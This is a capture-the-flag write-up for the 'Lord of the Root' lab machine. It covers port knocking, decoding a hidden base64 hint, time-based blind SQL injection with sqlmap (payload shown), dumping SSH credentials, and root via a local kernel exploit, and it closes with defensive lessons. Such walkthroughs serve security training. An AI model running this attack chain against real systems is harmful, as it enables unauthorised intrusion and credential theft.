# Lord of the Root — Writeup

**Flag:**
> "There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power." – Gandalf

## Recon

An initial scan showed only one open port:

```
22/tcp open ssh
```

The box hinted at port knocking ("that's easy, how 1,2,3"), so I knocked ports **1, 2, 3** in sequence. After knocking, a second port opened:

```
1337/tcp open http    Apache httpd 2.4.7 (Ubuntu)
```

## Web Enumeration

I ran gobuster against port 1337:

```bash
gobuster dir -u http://192.168.1.185:1337 -w /usr/share/wordlists/dirb/common.txt -x php,txt,zip,bak,html,jpg
```

This turned up `404.html` (status 200), which is unusual for a 404 page — a strong sign it was hiding something. Viewing the page source revealed a base64-encoded string:

```
THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
```

Decoding it:

```bash
echo 'THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh' | base64 -d
# Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
```

This was itself base64 — decoding again:

```bash
echo 'Lzk3ODM0NTIxMC9pbmRleC5waHA=' | base64 -d
# /978345210/index.php
```

This revealed a hidden login page at `/978345210/index.php`. A quick peek at the page source/comments also leaked a hint: `frodobaggins`.

## SQL Injection

After trying several manual approaches without luck, I tested the login form for SQL injection with sqlmap:

```bash
sqlmap -r req.txt --dbs --batch --level 5 --random-agent
```

The POST parameter `username` was vulnerable to **time-based blind SQL injection**:

```
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=tom' AND (SELECT 1880 FROM (SELECT(!SLEEP(5)))HpaZ)-- ONkS&password=tom&submit=Login
```

Back-end identified as MySQL, running on Linux/Apache/PHP 5.5.9. I enumerated the database:

```bash
sqlmap -r req.txt -D Webapp --tables --batch
```

```
Database: Webapp
[1 table]
+-------+
| Users |
+-------+
```

Dumping the `Users` table yielded valid SSH credentials:

```
smeagol : MyPreciousR00t
```

## Initial Shell

Logged in over SSH as `smeagol` using the dumped credentials.

## Privilege Escalation

With a low-privilege shell, I identified a suitable kernel/local privesc exploit (compiled as `39166.c`, a known Linux privilege-escalation exploit) and compiled it locally:

```bash
gcc 39166.c -o pwned
./pwned
```

This dropped straight into a root shell:

```
root@LordOfTheRoot:~# cd /root
root@LordOfTheRoot:/root# ls -la
...
root@LordOfTheRoot:/root# cat Flag.txt
"There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power." – Gandalf
```

## Summary / Attack Chain

1. Only port 22 open initially → port knocking sequence **1, 2, 3** opened port 1337 (HTTP)
2. Gobuster found a suspicious `404.html` returning `200 OK`, containing a double base64-encoded hint
3. Decoded hint led to a hidden login page: `/978345210/index.php`
4. Page source/comments leaked the username hint `frodobaggins`
5. Login form's `username` parameter was vulnerable to time-based blind SQLi (confirmed/exploited with sqlmap)
6. Dumped the `Users` table → got SSH credentials `smeagol:MyPreciousR00t`
7. SSH in as `smeagol`
8. Compiled and ran a local kernel exploit (`39166.c`) → root

## Lessons / Takeaways

- Port knocking is obscurity, not security — once discovered, it adds no real protection.
- A "404 page" returning `200 OK` with unusual content is always worth inspecting closely; attackers (and defenders) should watch for anomalous status codes on error pages.
- Multi-layer encoding (base64-in-base64) is trivial to peel back — don't rely on encoding as a security control.
- User-controlled input in authentication forms must always be parameterized; this box's SQLi let an attacker fully dump the user table.
- Outdated kernels remain a common and reliable path to root — keep systems patched.
